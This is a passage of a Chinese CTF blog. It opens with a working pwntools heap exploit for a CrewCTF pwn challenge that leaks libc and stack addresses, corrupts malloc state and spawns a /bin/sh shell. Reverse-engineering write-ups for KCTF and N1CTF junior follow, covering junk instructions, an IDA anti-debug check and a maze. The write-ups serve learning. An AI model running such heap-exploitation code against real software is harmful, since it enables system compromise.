class="string">&#x27;sp&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">        context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">        gdb.<span class="built_in">attach</span>(p, <span class="string">&#x27;break-rva 0x1361\nbreak-rva 0x153B&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="number">0x1c</span>):</span><br><span class="line">    <span class="built_in">malloc</span>()</span><br><span class="line"></span><br><span class="line"><span class="built_in">edit</span>(<span class="number">0</span>, <span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x78</span>+<span class="string">&#x27;\x01\x0b&#x27;</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">malloc</span>() # <span class="number">0x18</span></span><br><span class="line"><span class="built_in">show</span>(<span class="number">2</span>)</span><br><span class="line"><span class="built_in">r</span>(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">libc = <span class="built_in">u64</span>(p.<span class="built_in">recv</span>(<span class="number">8</span>))<span class="number">-0x1ecbe0</span></span><br><span class="line">log.<span class="built_in">success</span>(<span class="string">&quot;@ libc: &quot;</span>+<span class="built_in">hex</span>(libc))</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="number">0x1c</span>,<span class="number">0x16</span>,<span class="number">-1</span>):</span><br><span class="line">    <span class="built_in">free</span>(i)</span><br><span class="line"></span><br><span class="line"># global_max_fast = <span class="number">0x1eeea0</span></span><br><span class="line"><span class="built_in">malloc</span>()</span><br><span class="line"><span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="number">14</span>):</span><br><span class="line">    <span class="built_in">free</span>(<span class="number">29</span>) <span class="keyword">if</span> i==<span class="number">0</span> <span class="keyword">else</span> <span class="built_in">free</span>(<span class="number">28</span><span class="number">+2</span>*i)</span><br><span class="line">    <span class="built_in">edit</span>(<span class="number">2</span>, <span class="built_in">p64</span>(libc<span class="number">+0x1eee98</span><span class="number">+0x80</span>*i))</span><br><span class="line">    <span class="built_in">malloc</span>()</span><br><span class="line">    <span class="built_in">malloc</span>()</span><br><span class="line">    <span class="keyword">if</span> i==<span class="number">13</span>:</span><br><span class="line">        <span class="built_in">edit</span>(<span class="number">31</span><span class="number">+2</span>*i, b<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x68</span>+b<span class="string">&#x27;\x82\x00&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">edit</span>(<span class="number">31</span><span class="number">+2</span>*i, b<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x78</span>+b<span class="string">&#x27;\x82\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(<span class="number">56</span>)</span><br><span class="line"><span class="built_in">edit</span>(<span class="number">2</span>, <span class="built_in">p64</span>(libc<span class="number">+0x1ef588</span>))</span><br><span class="line"><span class="built_in">malloc</span>()</span><br><span class="line"><span class="built_in">malloc</span>()</span><br><span class="line"><span class="built_in">show</span>(<span class="number">59</span>)</span><br><span class="line"><span class="built_in">r</span>(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line"><span class="built_in">r</span>(<span class="string">&#x27;\0&#x27;</span>*<span class="number">0x68</span>)</span><br><span class="line">stack = <span class="built_in">u64</span>(p.<span class="built_in">recv</span>(<span class="number">8</span>))</span><br><span class="line">log.<span class="built_in">success</span>(<span class="string">&quot;@ stack: &quot;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">one = libc<span class="number">+0xe3afe</span></span><br><span class="line"><span class="meta"># leaking stack</span></span><br><span class="line"><span class="built_in">free</span>(<span class="number">58</span>)</span><br><span class="line"><span class="built_in">edit</span>(<span class="number">2</span>, <span class="built_in">p64</span>(stack<span class="number">-0x334</span>))</span><br><span class="line"><span class="built_in">malloc</span>()</span><br><span class="line"><span class="built_in">free</span>(<span class="number">0x82</span>)</span><br><span class="line"><span class="built_in">malloc</span>()</span><br><span class="line"></span><br><span class="line"><span class="built_in">z</span>()</span><br><span class="line"><span class="built_in">edit</span>(<span class="number">61</span>, b<span class="string">&#x27;\0&#x27;</span>*<span class="number">0x4</span>+<span class="built_in">flat</span>(libc<span class="number">+0x1eee48</span>))</span><br><span class="line"><span class="built_in">edit</span>(<span class="number">2</span>, <span class="string">&#x27;/bin/sh\0&#x27;</span>)</span><br><span class="line"><span class="built_in">edit</span>(<span class="number">1</span>, <span class="built_in">p64</span>(libc<span class="number">+0x52290</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.<span class="built_in">interactive</span>()</span><br></pre></td></tr></table></figure>





<h3 id="solution-02"><a href="#solution-02" class="headerlink" title="solution 02"></a>solution 02</h3><p>转到largebin attack</p>
<p>堆风水够造，largebin attack打stderr，然后打<code>malloc_assert</code>触发io调用链</p>
<h3 id="solution-03"><a href="#solution-03" class="headerlink" title="solution 03"></a>solution 03</h3><p>还是继续</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/11/19/2025crewctf/" data-id="cuidQ7bkKbF_JMeq4Sv7ib31t" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-2025看雪kctf" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/11/19/2025%E7%9C%8B%E9%9B%AAkctf/" class="article-date">
  <time class="dt-published" datetime="2025-11-19T12:48:53.961Z" itemprop="datePublished">2025-11-19</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="看雪kctf2025"><a href="#看雪kctf2025" class="headerlink" title="看雪kctf2025"></a>看雪kctf2025</h1><h2 id="签到题-废材少年觉醒"><a href="#签到题-废材少年觉醒" class="headerlink" title="签到题-废材少年觉醒"></a>签到题-废材少年觉醒</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> __fastcall <span class="title">sub_140001560</span><span class="params">(<span class="type">char</span> *a1, __int64 sz)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> sz == <span class="number">25</span></span><br><span class="line">      &amp;&amp; *a1 == <span class="string">&#x27;f&#x27;</span></span><br><span class="line">      &amp;&amp; a1[<span class="number">1</span>] == <span class="string">&#x27;l&#x27;</span></span><br><span class="line">      &amp;&amp; a1[<span class="number">2</span>] == <span class="string">&#x27;a&#x27;</span></span><br><span class="line">      &amp;&amp; a1[<span class="number">3</span>] == <span class="string">&#x27;g&#x27;</span></span><br><span class="line">      &amp;&amp; a1[<span class="number">4</span>] == <span class="string">&#x27;&#123;&#x27;</span></span><br><span class="line">      &amp;&amp; a1[<span class="number">5</span>] == <span class="string">&#x27;k&#x27;</span></span><br><span class="line">      &amp;&amp; a1[<span class="number">6</span>] == <span class="string">&#x27;c&#x27;</span></span><br><span class="line">      &amp;&amp; a1[<span class="number">7</span>] == <span class="string">&#x27;t&#x27;</span></span><br><span class="line">      &amp;&amp; a1[<span class="number">8</span>] == <span class="string">&#x27;f&#x27;</span></span><br><span class="line">      &amp;&amp; a1[<span class="number">9</span>] == <span class="string">&#x27;_&#x27;</span></span><br><span class="line">      &amp;&amp; a1[<span class="number">10</span>] == <span class="string">&#x27;t&#x27;</span></span><br><span class="line">      &amp;&amp; a1[<span class="number">11</span>] == <span class="string">&#x27;i&#x27;</span></span><br><span class="line">      &amp;&amp; a1[<span class="number">12</span>] == <span class="string">&#x27;m&#x27;</span></span><br><span class="line">      &amp;&amp; a1[<span class="number">13</span>] == <span class="string">&#x27;e&#x27;</span></span><br><span class="line">      &amp;&amp; a1[<span class="number">14</span>] == <span class="string">&#x27;_&#x27;</span></span><br><span class="line">      &amp;&amp; a1[<span class="number">15</span>] == <span class="string">&#x27;l&#x27;</span></span><br><span class="line">      &amp;&amp; a1[<span class="number">16</span>] == <span class="string">&#x27;e&#x27;</span></span><br><span class="line">      &amp;&amp; a1[<span class="number">17</span>] == <span class="string">&#x27;a&#x27;</span></span><br><span class="line">      &amp;&amp; a1[<span class="number">18</span>] == <span class="string">&#x27;p&#x27;</span></span><br><span class="line">      &amp;&amp; a1[<span class="number">19</span>] == <span class="string">&#x27;_&#x27;</span></span><br><span class="line">      &amp;&amp; a1[<span class="number">20</span>] == <span class="string">&#x27;2&#x27;</span></span><br><span class="line">      &amp;&amp; a1[<span class="number">21</span>] == <span class="string">&#x27;0&#x27;</span></span><br><span class="line">      &amp;&amp; a1[<span class="number">22</span>] == <span class="string">&#x27;2&#x27;</span></span><br><span class="line">      &amp;&amp; a1[<span class="number">23</span>] == <span class="string">&#x27;5&#x27;</span></span><br><span class="line">      &amp;&amp; a1[<span class="number">24</span>] == <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>flag{kctf_time_leap_2025}</p>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/11/19/2025%E7%9C%8B%E9%9B%AAkctf/" data-id="cuid9cIzWUfUiCGUS40gu-WFl" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-n1ctfjunior-re" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/11/18/n1ctfjunior-re/" class="article-date">
  <time class="dt-published" datetime="2025-11-18T03:04:13.000Z" itemprop="datePublished">2025-11-18</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/11/18/n1ctfjunior-re/">n1ctfjunior-re</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="FlowerHidden"><a href="#FlowerHidden" class="headerlink" title="FlowerHidden"></a>FlowerHidden</h2><p>32位ida查看</p>
<style>.tcnefjiwudpb{zoom:33%;}</style><img src="/2025/11/18/n1ctfjunior-re/1.png" class="tcnefjiwudpb" alt="image-20251119145209730">

<p>进入main有花指令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:00402FB0 loc_402FB0:                             ; DATA XREF: _main+3A↓o</span><br><span class="line">.text:00402FB0                 cmp     eax, 4</span><br><span class="line">.text:00402FB3                 jz      short locret_402FBA</span><br><span class="line">.text:00402FB5                 call    loc_402A60</span><br><span class="line">.text:00402FBA</span><br><span class="line">.text:00402FBA locret_402FBA:                          ; CODE XREF: .text:00402FB3↑j</span><br><span class="line">.text:00402FBA                 retn</span><br><span class="line">.text:00402FBA ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00402FBB                 align 10h</span><br></pre></td></tr></table></figure>

<p>去看loc_402A60</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:00402A7A                 mov     eax, 1</span><br><span class="line">.text:00402A7F                 imul    ecx, eax, 3</span><br><span class="line">.text:00402A82                 movsx   edx, byte_420100[ecx]</span><br><span class="line">.text:00402A89                 push    edx</span><br><span class="line">.text:00402A8A                 call    sub_4023E0</span><br></pre></td></tr></table></figure>

<p>从表 <code>byte_420100</code> 读取值，传入 <code>sub_4023E0</code>，ecx&#x3D;3，imul有符号整数乘法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.data:00420100 byte_420100     db 0                    ; DATA XREF: sub_401D80+63B↑o</span><br><span class="line">.data:00420100                                         ; sub_4024A0+4F↑r ...</span><br><span class="line">.data:00420101                 db    1</span><br><span class="line">.data:00420102                 db    2</span><br><span class="line">.data:00420103                 db    3</span><br><span class="line">.data:00420104                 db    4</span><br><span class="line">.data:00420105                 db    5</span><br><span class="line">.data:00420106                 db    6</span><br><span class="line">.data:00420107                 db    7</span><br></pre></td></tr></table></figure>

<p>byte_420100取值范围0~7</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.text:004023E0 sub_4023E0      proc near               ; CODE XREF: sub_4024A0+57↓p</span><br><span class="line">.text:004023E0                                         ; sub_4024A0+7A↓p ...</span><br><span class="line">.text:004023E0</span><br><span class="line">.text:004023E0 arg_0           = dword ptr  4</span><br><span class="line">.text:004023E0</span><br><span class="line">.text:004023E0                 mov     ebx, [esp+arg_0]</span><br><span class="line">.text:004023E4                 mov     eax, 0Ah</span><br><span class="line">.text:004023E9                 mov     ecx, ebx</span><br><span class="line">.text:004023EB                 not     eax</span><br><span class="line">.text:004023ED                 and     ebx, eax</span><br><span class="line">.text:004023EF                 not     eax</span><br><span class="line">.text:004023F1                 not     ecx</span><br><span class="line">.text:004023F3                 and     ecx, eax</span><br><span class="line">.text:004023F5                 or      ebx, ecx</span><br><span class="line">.text:004023F7                 inc     ebx</span><br><span class="line">.text:004023F8                 dec     ebx</span><br><span class="line">.text:004023F9                 mul     ebx</span><br><span class="line">.text:004023FB                 div     ebx</span><br><span class="line">.text:004023FD                 xor     ebx, eax</span><br><span class="line">.text:004023FF                 add     [esp+0], ebx</span><br><span class="line">.text:00402402                 retn    4</span><br><span class="line">.text:00402402 sub_4023E0      endp</span><br></pre></td></tr></table></figure>

<p>简化：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sub_4023E0:</span><br><span class="line">    mov     ebx, [esp+4]       ; ebx = arg</span><br><span class="line">    mov     eax, 0Ah           ; eax = 10</span><br><span class="line">    mov     ecx, ebx           ; ecx = arg</span><br><span class="line">    not     eax                ; eax = ~10</span><br><span class="line">    and     ebx, eax           ; ebx = arg &amp; ~10</span><br><span class="line">    not     eax                ; eax = 10</span><br><span class="line">    not     ecx                ; ecx = ~arg</span><br><span class="line">    and     ecx, eax           ; ecx = ~arg &amp; 10</span><br><span class="line">    or      ebx, ecx           ; ebx = (arg &amp; ~10) | (~arg &amp; 10)</span><br></pre></td></tr></table></figure>

<p><code>(arg &amp; ~mask) | (~arg &amp; mask)</code> 这个表达式是按位选择：当 <code>mask</code> 位为 1 时取原式&#x3D;<code>~arg</code> ，为 0 时原式&#x3D; <code>arg</code> 的那一位。代数上等价于 <code>arg ^ mask</code>（异或）。</p>
<p>本题mask&#x3D;0xA(10)，所以ebx&#x3D;arg^0xA。</p>
<p> inc指令用于将一个寄存器的值加1，dec指令用于将一个寄存器的值减1。</p>
<p>当前ebx&#x3D;arg^0xA，eax&#x3D;10</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mul     ebx                ; EDX:EAX = 10 * (arg^0xA)</span><br><span class="line">div     ebx                ;(10 * (arg^0xA))/(arg^0xA)</span><br><span class="line">xor     ebx, eax           ; ebx = EBX ^ 10</span><br><span class="line">add     [esp+0], ebx       ; *(DWORD*)(esp) += ebx   &lt;-- 修改返回地址</span><br><span class="line">ret     4</span><br></pre></td></tr></table></figure>

<p>div这里，如果(arg^0xA)!&#x3D;0，ebx &#x3D; (arg^0xA) ^ 10&#x3D;arg</p>
<p>到此这一长段乘除只是把 <code>ebx</code> 恢复为原始输入 <code>arg</code> ，是花指令</p>
<p>add这里，<code>esp+0</code> 是栈顶 <strong>返回地址</strong>（函数被调用时的 <code>ret</code> 地址）。因此它 <strong>把 <code>arg</code> 加到返回地址上</strong>（即修改返回地址，使得 <code>ret</code> 返回到 <code>return_address + arg</code>）。</p>
<p>[ ]取地址</p>
<table>
<thead>
<tr>
<th>平台 &#x2F; ABI</th>
<th>参数 1</th>
<th>参数 2</th>
<th>参数 3</th>
<th>参数 4</th>
<th>参数 5+</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td><strong>x86 (32位, cdecl&#x2F;stdcall)</strong></td>
<td><code>[esp+4]</code></td>
<td><code>[esp+8]</code></td>
<td><code>[esp+0xC]</code></td>
<td><code>[esp+0x10]</code></td>
<td>继续往上递增</td>
<td>所有参数都压栈；<code>[esp]</code> 是返回地址</td>
</tr>
<tr>
<td><strong>Windows x64 (MSVC ABI)</strong></td>
<td><code>RCX</code></td>
<td><code>RDX</code></td>
<td><code>R8</code></td>
<td><code>R9</code></td>
<td><code>[rsp+0x28]</code> 开始</td>
<td>栈上预留 32 字节 shadow space (<code>rsp+20h</code> 到 <code>rsp+40h</code>)，即使没用</td>
</tr>
<tr>
<td><strong>System V AMD64 (Linux, macOS, BSD)</strong></td>
<td><code>RDI</code></td>
<td><code>RSI</code></td>
<td><code>RDX</code></td>
<td><code>RCX</code></td>
<td><code>R8</code></td>
<td><code>R9</code></td>
</tr>
</tbody></table>
<p>sub_402A60，两次输入，第二次输入会被switch四个方向</p>
<p>迷宫终点是38，移动42次，累加和为117</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">64  49  49  49  49  49  48  48  48  48  49   0</span><br><span class="line">48  48  48  49  48  48  48  49  49  48  49   0</span><br><span class="line">49  49  48  49  48  49  48  48  49  48  49   0</span><br><span class="line">49  49  48  48  48  49  49  48  48  48  49   0</span><br><span class="line">49  49  48  49  49  48  48  48  49  49  49   0</span><br><span class="line">49  49  48  49  49  48  49  49  49  49  49   0</span><br><span class="line">49  48  48  48  48  48  49  49  49  49  49   0</span><br><span class="line">49  48  49  49  49  48  48  49  48  48  48   0</span><br><span class="line">49  48  48  48  49  49  48  48  48  49  48   0</span><br><span class="line">49  49  49  48  49  49  48  49  49  49  48   0</span><br><span class="line">49  49  49  48  48  48  48  48  48  48  38   0</span><br><span class="line">49  49  49  49  49  49  49  49  49  49  49   0</span><br></pre></td></tr></table></figure>

<p>sddssddwwddsdssaassaaaassddssdddwwddwddsss，程序验证通过，但是不是flag。发现ipu文件还没有使用，而且第一个输入也没被使用。</p>
<p>关注迷宫的第一个输入，注意到这里是有一个指针指向第一次输入的，看这个指针的交叉引用，可以看到一个验证和分发程序。</p>
<p>sub_1D80</p>
<p>首先，读入了1pmoluy.ipu文件，经过文件名解码，文件读入与解码。然后得到 4 个指针，分别指向不同解密后函数的入口。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">*(_DWORD *)dword_420FB0 = Buffer;</span><br><span class="line">qmemcpy(v16, &quot;FUNC&quot;, sizeof(v16));</span><br><span class="line"></span><br><span class="line">*(_DWORD *)(dword_420FB0 + 4) = *(_DWORD *)dword_420FB0 + sub_401AC0(*(_DWORD *)dword_420FB0, v16, v13);</span><br><span class="line"></span><br><span class="line">*(_DWORD *)(dword_420FB0 + 8) = *(_DWORD *)(dword_420FB0 + 4) + sub_401AC0(*(_DWORD *)(dword_420FB0 + 4), v16, v13);</span><br><span class="line"></span><br><span class="line">*(_DWORD *)(dword_420FB0 + 12) = *(_DWORD *)(dword_420FB0 + 8) + sub_401AC0(*(_DWORD *)(dword_420FB0 + 8), v16, v13);</span><br></pre></td></tr></table></figure>

<p>对比父进程名字的前 3 个字节。如果不匹配，<code>byte_420100[6] = 10;</code> → 改变全局控制流。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String2 = &#123; -26, -21, -18, -113 &#125;;</span><br><span class="line">for (m=0; m&lt;4; m++) String2[m] ^= 0x8F;</span><br><span class="line">_strnicmp(String1, String2, 3)</span><br></pre></td></tr></table></figure>

<p>strings2单字节异或得到字符串”ida”，如果父进程是 IDA，则会把 <code>byte_420100[6]</code> 设为 10。</p>
<p>sub_2790，异常处理函数，这里又改成了1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">int __usercall sub_402790@&lt;eax&gt;(int a1@&lt;ebp&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  if ( *(_DWORD *)(a1 + 0x10) == 2 )</span><br><span class="line">  &#123;</span><br><span class="line">    ++**(_DWORD **)(a1 + 8);</span><br><span class="line">    byte_420100[6] = 1;</span><br><span class="line">    *(_DWORD *)(a1 - 28) = sub_401370;</span><br><span class="line">    dword_420FC0 = *(_DWORD *)(a1 - 28);</span><br><span class="line">    __asm &#123; retn &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_DWORD *)(a1 - 36) = 0;</span><br><span class="line">  *(_DWORD *)(a1 - 4) = -2;</span><br><span class="line">  return *(_DWORD *)(a1 - 36);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>在反调试的函数中，调用了1pmoluy.ipu文件。文件中存储的是四个加密函数，经过解密后会被后面分发函数进行调用。然后根据路径进行顺序解密。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">int __usercall sub_401370@&lt;eax&gt;(int a1@&lt;eax&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  dword_420FB8 = a1;</span><br><span class="line">  if ( a1 == 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    (*(void (__cdecl **)(char *))dword_420FB0)(off_420234);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    switch ( dword_420FB8 )</span><br><span class="line">    &#123;</span><br><span class="line">      case 2:</span><br><span class="line">        (*(void (__cdecl **)(char *))(dword_420FB0 + 4))(off_420234);</span><br><span class="line">        break;</span><br><span class="line">      case 3:</span><br><span class="line">        (*(void (__cdecl **)(char *))(dword_420FB0 + 8))(off_420234);</span><br><span class="line">        break;</span><br><span class="line">      case 4:</span><br><span class="line">        (*(void (__cdecl **)(char *))(dword_420FB0 + 12))(off_420234);</span><br><span class="line">        break;</span><br><span class="line">      default:</span><br><span class="line">        return dword_420FB8;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_401210();</span><br><span class="line">  return dword_420FB8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>加密1 异或 左循环位移 异或 右循环位移<br>加密2 固定key生成固定box和对应固定key 这里dump其实就行<br>加密3 这里把boxdump下来试两下就会发现 这里仅仅是实现了加减法<br>加密4 根据key生成随机顺序换序 也可以dump下来然后固定换回来就行</p>
<h2 id="Pyramid"><a href="#Pyramid" class="headerlink" title="Pyramid"></a>Pyramid</h2><p>chal.pyc -&gt; pyramid.pyd -&gt; a_long_way_to_treasure() -&gt;  pyramid.pyc（异或）   -&gt;  checkinput.pyd(rc4)  -&gt; 白盒aes解flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Decompiled with PyLingual (https://pylingual.io)</span></span><br><span class="line"><span class="comment"># Internal filename: chal.py</span></span><br><span class="line"><span class="comment"># Bytecode version: 3.12.0rc2 (3531)</span></span><br><span class="line"><span class="comment"># Source timestamp: 1970-01-01 00:00:00 UTC (0)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pyramid</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">text = <span class="string">&#x27;A pyramid fortified with intricate defenses looms before you. \nIts secrets are locked behind layers of puzzles. \nYou stand at its base, challenged to unravel them all.&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;･････････････････････････････････････････････････････････････････&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> text.split(<span class="string">&#x27;\n&#x27;</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;  <span class="subst">&#123;line&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;･････････････････････････････････････････････････････････････････&#x27;</span>)</span><br><span class="line">pyramid.a_long_way_to_treasure()</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    os.remove(<span class="string">&#x27;checkinput.pyd&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<style>.fskqqvzcgcbm{}</style><img src="/2025/11/18/n1ctfjunior-re/1763435137247-6.png" class="fskqqvzcgcbm" alt="img">

<style>.omxojmwvklhb{zoom:67%;}</style><img src="/2025/11/18/n1ctfjunior-re/1763435137193-1.png" class="omxojmwvklhb" alt="img">

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">.rdata:0000000180008280 unk_180008280   db 0A9h                 ; DATA XREF: .rdata:0000000180007F80↑o</span><br><span class="line">.rdata:0000000180008281                 db  6Ch ; l</span><br><span class="line">.rdata:0000000180008282                 db  63h ; c</span><br><span class="line">.rdata:0000000180008283                 db  6Dh ; m</span><br><span class="line">.rdata:0000000180008284                 db  64h ; d</span><br><span class="line">.rdata:0000000180008285                 db  72h ; r</span><br><span class="line">.rdata:0000000180008286                 db  65h ; e</span><br><span class="line">.rdata:0000000180008287                 db  